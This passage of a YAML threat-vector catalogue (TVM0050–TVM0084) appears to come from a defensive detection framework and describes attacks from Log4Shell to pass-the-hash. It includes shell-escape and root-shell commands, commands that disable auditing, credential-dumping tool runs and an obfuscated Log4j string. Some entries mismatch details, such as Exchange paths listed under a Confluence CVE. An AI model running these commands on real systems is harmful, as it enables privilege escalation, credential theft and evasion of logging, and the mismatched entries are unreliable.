    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0049%5D-Create-a-process-with-a-token
  - id: TVM0050
    name: Web Path Traversal Attack
    description: 'Directory traversal (also known as file path traversal) is a web
      security vulnerability that allows an attacker to read arbitrary files on the
      server that is running an application.   By manipulating variables that reference
      files with “dot-dot-slash (../)” sequences and its variations or by using absolute
      file paths, it may be possible to access arbitrary files and directories stored
      on file system including application source code or configuration and critical
      system files. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0050%5D-Web-Path-Traversal-Attack
  - id: TVM0051
    name: Cross Site Scripting (XSS)
    description: Cross-Site Scripting (XSS) attacks are a type of injection, in which
      malicious scripts are injected into otherwise benign and trusted websites. XSS
      attacks occur when an attacker uses a web application to send malicious code,
      generally in the form of a browser side script, to a different end user. Flaws
      that allow these attacks to succeed are quite widespread and occur anywhere
      a web application uses input from a user within the output it generates without
      validating or encoding it.  An attacker can use XSS to send a malicious script
      to an unsuspecting user. The end user's browser has no way to know that the
      script should not be trusted, and will execute the script. Because it thinks
      the script came from a trusted source, the malicious script can access any cookies,
      session tokens, or other sensitive information retained by the browser and used
      with that site. These scripts can even rewrite the content of the HTML page.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0051%5D-Cross-Site-Scripting-%28XSS%29
  - id: TVM0052
    name: Web Application Login Bruteforcing
    description: 'A brute force attack can manifest itself in many different ways,
      but primarily consists in an attacker configuring predetermined values, making
      requests to a server using those values, and then analyzing the response. For
      the sake of efficiency, an attacker may use a dictionary attack (with or without
      mutations) or a traditional brute-force attack (with given classes of characters
      e.g.: alphanumeric, special, case (in)sensitive). Considering a given method,
      number of tries, efficiency of the system which conducts the attack, and estimated
      efficiency of the system which is attacked the attacker is able to calculate
      approximately how long it will take to submit all chosen predetermined values. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0052%5D-Web-Application-Login-Bruteforcing
  - id: TVM0053
    name: URL Redirection Attacks
    description: '##EC DIGIT S position EC DIGIT SECURITY ASSURANCE provided the results
      of their analysis: the redirect could not be confirmed. The website does not
      redirect to a different page.  Regarding the report for external service interaction
      (DNS) EC DIGIT SECURITY ASSURANCE has tested the interaction and it seems to
      be  occurring. However, external DNS interaction is not considered a vulnerability  unless
      possible escalation path is demonstrated.  DNS lookups without any intention
      of connecting to the remote host are considered harmless. In this case, it seems
      that there''s a firewall or  another security service that examines the URL
      parameters of the request. In cases where a redirect URL is detected, the service
      blocks it  (when it''s a known URL) or initiates an external look-up to verify
      the security of the redirected URL.  ## Overall threat vector description Unvalidated
      redirects and forwards are possible when a web application accepts untrusted
      input that could cause the web application to redirect the request to a URL
      contained within untrusted input. By modifying untrusted URL input to a malicious
      site, an attacker may successfully launch a phishing scam and steal user credentials.  Because
      the server name in the modified link is identical to the original site, phishing
      attempts may have a more trustworthy appearance. Unvalidated redirect and forward
      attacks can also be used to maliciously craft a URL that would pass the application''s
      access control check and then forward the attacker to privileged functions that
      they would normally not be able to access. '
    criticality: Baseline - Negligible
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0053%5D-URL-Redirection-Attacks
  - id: TVM0054
    name: Confluence Server Webwork OGNL injection
    description: 'CVE-2021-26084 is a vulnerability in Confluence. It originates from
      the use of Object-Graph Navigation Language (OGNL) in Confluence’s tag system.
      The vulnerability permits the injection of OGNL code and thus execution of arbitrary
      code on computers with Confluence Server or Confluence Data Center installed.
      In some cases, even a user who is not authenticated can exploit the vulnerability
      (if the option Allow people to sign up to create their account is active).  Atlassian
      considers this vulnerability critical. It has a 9.8 CVSS severity rating, and
      several proof-of-concepts for exploiting it, including a version that permits
      remote code execution (RCE), are already available online.  Vulnerable pages
      are as follow: /ecp/default.aspx /ecp/PersonalSettings/HomePage.aspx /ecp/PersonalSettings/HomePage.aspx4E
      /ecp/Organize/AutomaticReplies.slab /ecp/RulesEditor/InboxRules.slab /ecp/Organize/DeliveryReports.slab
      /ecp/MyGroups/PersonalGroups.aspx /ecp/MyGroups/ViewDistributionGroup.aspx /ecp/Customize/Messaging.aspx
      /ecp/Customize/General.aspx /ecp/Customize/Calendar.aspx /ecp/Customize/SentItems.aspx
      /ecp/PersonalSettings/Password.aspx /ecp/SMS/TextMessaging.slab /ecp/TroubleShooting/MobileDevices.slab
      /ecp/Customize/Regional.aspx /ecp/MyGroups/SearchAllGroups.slab /ecp/Security/BlockOrAllow.aspx '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0054%5D-Confluence-Server-Webwork-OGNL-injection
  - id: TVM0055
    name: Microsoft Exchange Validation Key RCE
    description: A remote code execution vulnerability exists in Microsoft Exchange
      Server when the server fails to properly create unique keys at install time.
      Knowledge of the validation key allows an authenticated user with a mailbox
      to pass arbitrary objects to be deserialized by the web application, which runs
      as SYSTEM. This allows the adversary to turn a low-level access into a full
      system compromise, meaning all emails and potentially Active Directory.
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0055%5D-Microsoft-Exchange-Validation-Key-RCE
  - id: TVM0056
    name: Web Vulnerability Scanner Usage
    description: 'Adversaries may scan web applications for vulnerabilities in an
      attempt to prepare a larger attack, using commercial off-the-shelf of customized
      open source tools. They often try to exploit a CVE soon after it was made public,
      but also may scan for routine undiscovered vulnerabilities in custom or enterprise
      grade software.   Web vulnerability scanners work by automating several processes.
      These include application spidering and crawling, discovery of default and common
      content, and probing for common vulnerabilities such as cross-site scripting
      (XSS), SQL injection, and cross-site request forgery (CSRF).  Scanners may be
      passive or active : passive scanners analyze the server response to identify
      patterns indicating a potential vulnerability, but do not attempt to exploit
      it. Active scanners on the other hand, try to exploit at every possibility with
      a set of automated manoeuvers, typically injection patterns.'
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0056%5D-Web-Vulnerability-Scanner-Usage
  - id: TVM0057
    name: Log4Shell RCE exploit in Apache Log4j
    description: 'Log4j2 vulnerability gives an attacker remote code capabilities
      to the compromised system or try to retrieve sensitive information such as  credentials
      and API keys, escalate privileges locally (on the vuln server) or can be used
      as pivot to scan the internal network where the vulnerable server is placed.
      The remote code execution (RCE) vulnerabilities in Apache Log4j 2 is also referred
      to as “Log4Shell”.  JNDI features used in configuration, log messages, and parameters
      don''t protect against attacker controlled LDAP and other JNDI related endpoints.
      An attacker who can control log messages or log message parameters can execute
      arbitrary code loaded from LDAP servers when message lookup substitution is
      enabled.  An attacker performs an HTTP request against a target system, which
      generates  a log using Log4j 2 that leverages JNDI to perform a request to the
      attacker controlled site. The vulnerability then causes the exploited process
      to reach  out to the site and execute the payload. The attackers are obfuscating
      the  detection mechanisms with crafted strings contains "jndi" parameter as
      for example {jndi:${lower:l}}${lower:d}a${lower:p}${${::-j}}${::-n}${::-d}${::-i}.   Once
      in control of log messages or log message parameters, the adversary can execute  arbitrary
      code loaded from LDAP servers when message lookup substitution is  enabled.
      Log4Shell exploit can be used command and control (CnC) servers technique to
      spoof legitimate domains. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0057%5D-Log4Shell-RCE-exploit-in-Apache-Log4j
  - id: TVM0058
    name: Container privilege escalation via Kubernetes service account
    description: 'Overly permissive Kubernetes service account mounted into Kubernetes
      pod accessible for attacker  can be abused to perform privilege escalation attacks
      via direct API calls to Kubernetes API. Example scenarios are: starting a privileged
      container to jump out to host OS, reading secrets from another namespace or
      manipulate Kubernetes authorization. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0058%5D-Container-privilege-escalation-via-Kubernetes-service-account
  - id: TVM0059
    name: Kubernetes user privilege escalation via misconfigured RBAC policies
    description: 'Misconfigured RBAC policies can be exploited via multiple vectors.
      There are multiple techniques for privilege escalation via Pod creation even
      with Pod Security Policy enabled.  The get, list and watch verbs can all return
      the full details of a resource, for example secrets.  The following Kubernetes
      API verbs: bind, escalate and impersonate can be exploited for privilege escalation
      if  the user has rights to use them.  '
    criticality: Medium
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0059%5D-Kubernetes-user-privilege-escalation-via-misconfigured-RBAC-policies
  - id: TVM0060
    name: Kubernetes privilege escalation via misconfigured PSP policies
    description: 'Unhardened Pod Security Policies may be abused to escalate privileges
      in Kubernetes environment.  '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0060%5D-Kubernetes-privilege-escalation-via-misconfigured-PSP-policies
  - id: TVM0061
    name: Container privilege escalation via cloud API metadata access
    description: 'Query cloud metadata API accessible from container for credentials
      or use it in privilege escalation attacks. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0061%5D-Container-privilege-escalation-via-cloud-API-metadata-access
  - id: TVM0062
    name: Container privilege escalation via network service accessible to container
    description: 'Insufficient network restrictions set on container may lead to exploitation
      of network services  reachable from that Pod. An attacker may try to access
      Kubernetes or Docker related endpoints, services without authentication or containing
      security vulnerabilities available from Pod.  Successful exploitation may lead
      to privilege escalation.  '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0062%5D-Container-privilege-escalation-via-network-service-accessible-to-container
  - id: TVM0063
    name: DoS via malicious Sysdig policies
    description: 'Sysdig runtime policies can be configured to pause, stop or restart
      container violating security policy.  On top of that Kubernetes Admission controller
      can prevent any container violating the policy from starting. Policies are stored
      in git repository and applied via Sysdig backend to all Sysdig agents. Malicious
      user can use this mechanism to cause DoS in container environments protected
      by Sysdig. '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0063%5D-DoS-via-malicious-Sysdig-policies
  - id: TVM0064
    name: Secrets exposed by Sysdig capture file
    description: 'Sysdig Capture files may contain sensitive data. This data can be
      accessed by Sysdig backend users or via cloud storage. Unauthorized access to
      this data by malicious Sysdig backend user or thru unsecured cloud storage may
      lead to sensitive data leak.  '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0064%5D-Secrets-exposed-by-Sysdig-capture-file
  - id: TVM0065
    name: Threat actors creating AWS Amplify website for data exfiltration
    description: 'AWS Amplify is a service that allows you to build websites quickly
      and efficiently  based on AWS S3 and to publish information in this way online.
      It uses AWS managed S3 buckets for this, and the only information available
      to a defender is in   cloudtrail on the account where Amplify is used.  Based
      on a recent incident, but where instead of accidental information leakage,  a
      threat actor uses the same method for exfiltration of data with a low  likelihood
      of this being detected at all by the blue team. '
    criticality: High
    tlp: amber+strict
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0065%5D-Threat-actors-creating-AWS-Amplify-website-for-data-exfiltration
  - id: TVM0066
    name: M365 illicit application consent grant attacks
    description: 'After the illicit application has been granted consent, it has account-level
      access to data without the need for an organizational account. Normal remediation
      steps, like  resetting passwords for breached accounts or requiring Multi-Factor
      Authentication  (MFA) on accounts, are not effective against this type of attack,
      since these are  third-party applications that are external to the organization.  Example:
      365-Stealer is a tool written in Python3 which can be used in illicit consent
      grant attacks. When the victim grants his consent, the attacker gets their Refresh
      Token which can be used to request multiple Tokens that can help in further
      accessing data like Mails, Notes, Files from OneDrive and others. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0066%5D-M365-illicit-application-consent-grant-attacks
  - id: TVM0067
    name: Adversaries may modify runtime policies of a compromised Sysdig server
    description: 'A threat actor, who has managed to obtain valid admin credentials
      to an  in-use Sysdig SaaS backend server, or who has identified an authentication
      bypass, or who has obtained valid session tokens for backend server access abuses
      the backend access to perform impact type scenarios on containers managed by
      the backend by creating new, malicious Sysdig runtime policies,  which can either
      be meant to gather information, lateral movement, or to  cause disruptions. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0067%5D-Adversaries-may-modify-runtime-policies-of-a-compromised-Sysdig-server
  - id: TVM0068
    name: Addition of new admin users on a compromised Sysdig instance
    description: 'A threat actor, who has managed to obtain valid admin credentials
      to an  in-use Sysdig SaaS backend server, or who has identified an authentication
      bypass, or who has obtained valid session tokens for backend server access abuses
      the backend access to enable persistence on the backend by creating a new Sysdig
      admin user, which might survive past detection of malicious activity on the
      compromised Sysdig backend admin user account. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0068%5D-Addition-of-new-admin-users-on-a-compromised-Sysdig-instance
  - id: TVM0069
    name: CrackMapExec (CME) on endpoints or being downloaded
    description: 'CrackMapExec is a post-compromise tool that contains a number of
      modules and functionalities that allow red teams, pentesters and threat actors
      to perform post-compromise actions. Detecting both the presence of the tool
      itself, plus the usage of the tool is an important baseline security detection. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0069%5D-CrackMapExec-%28CME%29-on-endpoints-or-being-downloaded
  - id: TVM0070
    name: Usage of CrackMapExec module Masky on compromised endpoint
    description: 'CrackMapExec is a post-compromise tool that contains a number of
      modules and functionalities that allow red teams, pentesters and threat actors
      to perform post-compromise actions. Detecting both the presence of the tool
      itself, plus the usage of the tool is an important baseline security detection.  Masky
      is a python library providing an alternative way to remotely dump domain users’
      credentials thanks to an ADCS. A  command line tool has been built on top of
      this library in order to easily harvest PFX, NT hashes and TGT on a larger  scope.  This
      tool does not exploit any new vulnerability and does not work by dumping the
      LSASS process memory. Indeed, it  only takes advantage of legitimate Windows
      and Active Directory features (token impersonation, certificate  authentication
      via kerberos and NT hashes retrieval via PKINIT).  Masky is a new module, which
      in certain ways is less noisy than dumping LSASS, but if AD CS CAs have auditing
      enabled, will be very noisy and detectable. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0070%5D-Usage-of-CrackMapExec-module-Masky-on-compromised-endpoint
  - id: TVM0071
    name: Use of customervoice.microsoft.com to host Phishing domains
    description: 'This threat vector is based on real phishing domains built and utilized
      by a real, still unknown threat actor. The subdomain  customervoice.microsoft.com
      should be blocked on forward proxies by most  organizations, unless they have
      legit reasons to have traffic to this, and legit traffic going there. '
    criticality: Low
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0071%5D-Use-of-customervoice.microsoft.com-to-host-Phishing-domains
  - id: TVM0072
    name: Pass the hash using impersonation within an existing process
    description: 'Adversaries may use a particular flavor of pass the hash - to leverage  an
      acquired handle (hash) on NT AUTHORITY\SYSTEM access token to spawn a  new NT
      AUTHORITY\SYSTEM context process, impersonate the token for this process into
      the attacker-desired existing thread, and then kill the  spawned NT AUTHORITY\SYSTEM
      process again, making it a temp process used to allow the threat actor to elevate
      privileges to NT AUTHORITY\SYSTEM.  This sets the technique apart from spawning
      a new process with the  attacker-desired privileges that pass the hash without
      use of the  /IMPERSONATE option leads to.   Elevating privileges on Windows
      to System allows a threat actor (or  sysadmin) to do things that are not possible
      without SYSTEM/root  privileges.  Pass the hash is a method of authenticating
      as a user without having  access to the user''s cleartext password by stealing
      password hashes. This  method bypasses standard authentication steps that require
      a cleartext  password, moving directly into the portion of the authentication
      that uses  the password hash.   Mimikatz sekurlsa module with the /impersonate
      option implements this particular approach as an option alongside other more
      known NTLM based procedures. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0072%5D-Pass-the-hash-using-impersonation-within-an-existing-process
  - id: TVM0073
    name: Modification of Windows Audit Policies to evade detection
    description: 'Adversaries may use "auditpol" and its sub-commands in a command
      prompt  to disable auditing or clear the audit policy. Security audit policy
      settings  can be changed by running secpol.msc, then navigating to Security
      Settings\Local  Policies\Audit Policy for basic audit policy settings or Security
      Settings\Advanced  Audit Policy Configuration for advanced audit policy settings.  Audit_Policy_Microsoft,
      Advanced_sec_audit_policy_settings auditpol.exe may also  be used to set audit
      policies.  To enable or disable a specified setting or audit category, adversaries
      may use the  /success or /failure parameters.   For example, auditpol /set /category:”Account
      Logon” /success:disable /failure:disable  turns off auditing for the Account
      Logon category. Disable the Windows audit policy  will lead to prevention of
      telemetry data being written into the event logs.  For disabling of this policy
      can be used auditpol commands with /set parameter.   For disable the policy:
      auditpol /set /category:"Account Logon" /success:disable /failure:disable auditpol
      /set /category:"Logon/Logoff" /success:disable /failure:disable auditpol /set
      /category:"Detailed Tracking" /success:disable  For cleanup the policy: auditpol
      /set /category:"Account Logon" /success:enable /failure:enable auditpol /set
      /category:"Detailed Tracking" /success:enable auditpol /set /category:"Logon/Logoff"
      /success:enable /failure:enable  Audit policy settings under Security Settings\Advanced
      Audit Policy Configuration can be modified that may lead to disabled audit compliance,
      for example disabling of SACL list for auditing of user''s access control. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0073%5D-Modification-of-Windows-Audit-Policies-to-evade-detection
  - id: TVM0074
    name: Container privilege escalation via kernel or container runtime exploit
    description: 'Vulnerabilities in container runtime (Docker, containerd, etc.)
      or kernel  (Linux or Windows) can be exploited by a threat actor with execution  ability
      to jump out from container to host system and gain  root/administrator privileges
      depending on vulnerability type.  '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0074%5D-Container-privilege-escalation-via-kernel-or-container-runtime-exploit
  - id: TVM0075
    name: Mimikatz execution on compromised endpoint
    description: 'Mimikatz is a very versatile tool that comes with a lot of  options
      and capabilities. Detection of known Atomic IOCs of  the mimikatz tool itself
      or the atomic IOCs of invoke-mimikatz  powershell scripts, is very important,
      as it both signals a  compromised endpoint, plus shows a noisy threat actor
      trying  to EoP and move laterally.  '
    criticality: Emergency
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0075%5D-Mimikatz-execution-on-compromised-endpoint
  - id: TVM0076
    name: Sudo vulnerability allows attackers to gain root privileges
    description: 'Sudo vulnerability (CVE-2021-3156) allows users to perform commands
      from terminals  with elevated privileges and to control who can perform these
      commands on the system,  it allows a system administrator to delegate authority
      to give certain users  (or groups of users) the ability to run some (or all)
      commands as root or another  user while providing an audit trail of the commands
      and their arguments.   Also dubbed Baron Samedit (a play on Baron Samedi and
      sudoedit), sudo before 1.9.5p2  contains an off-by-one error that can result
      in a heap-based buffer overflow, which  allows privilege escalation to root
      via "sudoedit -s" and a command-line argument  that ends with a single backslash
      character.  When sudo runs a command in shell mode, either via the -s or -i
      command line option,  it escapes special characters in the command’s arguments
      with a backslash. The sudoers  policy plugin will then remove the escape characters
      from the arguments before evaluating  the sudoers policy (which doesn’t expect
      the escape characters) if the command is being  run in shell mode.  In the command
      line parsing code, it is possible to run sudoedit with either the -s or -i  options,
      setting a flag that indicates shell mode is enabled. Because a command is not  actually
      being run, sudo doesn''t escape special characters. The code than may decides  whether
      to remove the escape characters and will not check whether a command is actually  being
      run, just that the shell flag is set. This inconsistency is what makes the bug  exploitable. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0076%5D-Sudo-vulnerability-allows-attackers-to-gain-root-privileges
  - id: TVM0077
    name: SpringShell (Spring4Shell) Zero-Day Vulnerability
    description: 'SpringShell or Spring4Shell—can be exploited when an attacker sends
      a  specially crafted query to a web server running the Spring Core framework.
      In affected versions, an RCE is achievable by manipulating the ClassLoader  via
      a carefully composed HTTP POST request.  This vulnerability allows an attacker
      to provide a specially crafted SpEL as  a routing-expression that may result
      in remote code execution and access  to local resources. The exploit is using
      a critical remote code execution  (RCE) vulnerability CVE-2022-22963.   A remote
      attacker can obtain an AccessLogValve object through the framework’s  parameter
      binding feature and use malicious field values to trigger the pipeline  mechanism
      and write to a file in an arbitrary path. A common way to exploit this  access
      is to redirect the access log to write a web shell to the application''s root
      folder by manipulating various properties of the AccessLogValve object, including
      pattern, suffix, directory and prefix. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0077%5D-SpringShell-%28Spring4Shell%29-Zero-Day-Vulnerability
  - id: TVM0078
    name: Pass the hash attack to elevate privileges
    description: 'Elevating privileges on Windows to System allows a threat actor
      (or  sysadmin) to do things that are not possible without SYSTEM/root  privileges.  Pass
      the hash is a method of authenticating as a user, without having  access to
      the user''s cleartext password, by stealing password hashes and  using this
      password hash to authenticate directly to a resource via a  third party non-Microsoft
      tool such as Mimikatz. This method bypasses  standard authentication steps that
      require a cleartext password, moving directly into the portion of the authentication
      that uses the password  hash.  Mimikatz sekurlsa module without the /impersonate
      option implements the standard pass-the-hash technique, which works by authenticating
      to a resource, by in the  background spawning a new process in the context of
      the hash and attacker- desired elements. For examples, see the reference to
      thehacker.recipes. '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0078%5D-Pass-the-hash-attack-to-elevate-privileges
  - id: TVM0079
    name: Illicit VPC peering requests
    description: 'Threat actors may attempt to gain initial access to EC AWS environments
      by sending a malicious/illicit VPC peering request to EC VPC administrators.
      If the VPC administrator approves the request, the adversary would see their  network
      joined with the target, and be able to pivot there freely.  VPC peering requests
      could also be used in the data exfil stage by  a threat actor using this method
      to send data out of an EC AWS account that the threat actor controls  Virtual
      Private Clouds, or VPCs, is a logically isolated portion of  networking that
      AWS assigns to clients. VPC peering is a feature that allows VPCs living in
      different accounts to be joined in a common IP space, for example to  allow
      different services to communicate to each others. '
    criticality: Low
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0079%5D-Illicit-VPC-peering-requests
  - id: TVM0080
    name: Adversary abuses sudo elevation control mechanism
    description: 'Sudo is a command-line utility for Unix and Linux-based systems
      that can provide an effective way to give specific user permissions to run root
      (most powerful) level commands on the system. Unfortunately, some misconfigurations
      in sudo functionality can allow threat actors to escalate their privileges to
      root access.  If the file /etc/sudoers (used to store all sudo privileges) is
      modified this can grant to the attacker elevation of privileges. Attackers may
      use custom parameters with sudo to edit the sudoers file. For example -f or
      -l can be used to edit this file or list which commands or binaries the current
      user has access to run.  GTFOBins is a list of Unix binaries which is used by
      the threat actors to bypass local security restrictions in misconfigured systems.
      GTFOBins allows to search for binaries or commands whether they are executed
      as sudo and if they provide access to normally restricted actions. The repo
      list contains 300+ commands that could be abused for different purposes if not
      configured using this filter. The current list is an open collaborative project.
      Link: https://gtfobins.github.io/#+sudo  Examples:   A "tar" option can be exploited
      to write to arbitrary files (works only for GNU tar). If write data to files,
      it may be used for privileged writes on the files ouside a restricted file system.
      A "tar" command can break out from restricted environments, using spawn of an
      interactive system shell.  Reference: https://gtfobins.github.io/gtfobins/tar/  tar
      -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh  For
      GNU tar: tar xf /dev/null -I ''/bin/sh -c "sh <&2 1>&2"''  or (for GNU tar when
      limited command argument injection is available)  TF=$(mktemp) echo ''/bin/sh
      0<&1'' > "$TF" tar cf "$TF.tar" "$TF" tar xf "$TF.tar" --to-command sh rm "$TF"*  The
      pkexec command can be exploited to gain a root shell and to access the file
      system, escalate or maintain privilege access.   Reference: https://gtfobins.github.io/gtfobins/pkexec/  sudo
      pkexec /bin/sh '
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0080%5D-Adversary-abuses-sudo-elevation-control-mechanism
  - id: TVM0081
    name: Collect credentials from text files in Windows using automated dumping tools
    description: 'Malicious actors are using extraction automation tools like Seatbelt
      and winPEASany  for gathering of generic data, for example hidden files or folders
      in home directory C:\Users or in other user''s directories, recycle bin for
      credential files (example in  local App user data), system info files or checking
      for credentials in Windows Vault  and Windows credential manager or in the registers,
      checking for saved credentials in browsers like chrome or Firefox. winPEASany
      tool can check also for cloud credentials in Sitelist.xml files and cached GPP
      passwords. This tool can enumerate OneDrive in O365 for saved user''s credentials.
      The collected data can be in different formats like: .txt, .xml (e.g. Unatended),
      ini putty configs, sql developer configs, slack files  and others. By default
      only some filenames that could contain credentials are searched  and searchall
      parameter is used to search all files in the list.  When the tools are unpackaged
      on the target Windows system, variety of automated  commands extract generic
      data from the system that may contain user''s  credentials.  Example for PEASS-ng
      parameters which are used to search for file information and  other sources
      of data that may contain user''s credential data (winpeas.exe filesinfo  or
      winpeas.exe fileanalysis)  - systeminfo (search for system information) - windowscreds
      (search for windows credentials) - userinfo (search for user information) -
      filesinfo (search for generic files that can contains credentials) - fileanalysis
      (search for specific files that can contains credentials  and for regexes inside
      files)  Examples:   - run: winpeas.exe userinfo > winpeas_userinfo.txt - run:
      winpeas.exe systeminfo > winpeas_systeminfo.txt - run: winpeas.exe windowscreds
      > winpeas_wiindowscreds.txt - run: winpeas.exe filesinfo > winpeas_fileswithcreds.txt
      - run: type windowscreds.txt - run: type winpeas_windowscreds.txt - run: type
      winpeas_wiindowscreds.txt '
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0081%5D-Collect-credentials-from-text-files-in-Windows-using-automated-dumping-tools
  - id: TVM0082
    name: Scheduled tasks created with PowerShell
    description: 'A threat actor can use PowerShell to create tasks for nefarious
      purposes.   Scripts requires admin rights to create a new scheduled task. The
      script  will run in the context of the user who created the scheduled task.  Scheduled
      tasks are typically used to either connect to adversary  infrastructure, establish
      persistence or to execute binaries. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0082%5D-Scheduled-tasks-created-with-PowerShell
  - id: TVM0083
    name: Scheduled tasks created with command line
    description: 'Adversaries can use  Windows Command Shell (cmd.exe) to execute
      specific commands  to create scheduled tasks for the purposes of dwelling, execution
      of binaries,  or for communication to Command and Control server infrastructure.   Examples
      for creation of a scheduled task via command-line interface:  1. Create a daily
      task to run at specific time:     SCHTASKS /CREATE /SC DAILY /TN "FOLDERPATH\TASKNAME"
      /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT" /ST HH:MM  The folder path before the task
      name, under the /TN option, is not a requirement,  but it''ll help to keep the
      tasks separated. If the path is not specified, the task  will be created inside
      the Task Scheduler Library folder.  2. Create a weekly task to run at specific
      time:    SCHTASKS /CREATE /SC WEEKLY /D SUN /TN "FOLDERPATH\TASKNAME" /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT"
      /ST HH:MM  3. Create monthly task to run at specific time:    SCHTASKS /CREATE
      /SC MONTHLY /D 15 /TN "FOLDERPATH\TASKNAME" /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT"
      /ST HH:MM  4. Create a scheduled task that runs daily as a specific user:    SCHTASKS
      /CREATE /SC DAILY /TN "FOLDERPATH\TASKNAME" /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT"
      /ST HH:MM  Parameters that can be used in creation scheduled task command:   /CREATE
      - specifies the creation a new automated routine task  /SC - define the schedule
      of the task, for example it can include  MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY,
      ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT.  /D — specifies the day of the
      week to execute the task. (examples MON, TUE and etc)  /TN — specifies the task
      name and location, the task can be created in a specific  location directory
      (example /TN "FOLDERPATH\TASKNAME")  /ST — defines the time to run the task
      (in 24 hours format)  /RU — specifies the task to run under a specific user
      account.  /QUERY — displays all the system tasks. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0083%5D-Scheduled-tasks-created-with-command-line
  - id: TVM0084
    name: Scheduled tasks to connect to adversarial infrastructure
    description: 'A scheduled task is a task that is set to run automatically at a
      specific time or interval.   In the context of connecting to adversarial infrastructure,
      a scheduled task would be a task that is set up to automatically establish a
      connection to C2 infrastructure to check for ''orders'' at a specified time
      or interval.   This could involve running a script that usually establishes
      an outbound  connection. The exact details of how the task is set up would depend
      on the  specific adversarial infrastructure being used and the tools and protocols  available
      for connecting to it. '
    criticality: Medium
    tlp: clear
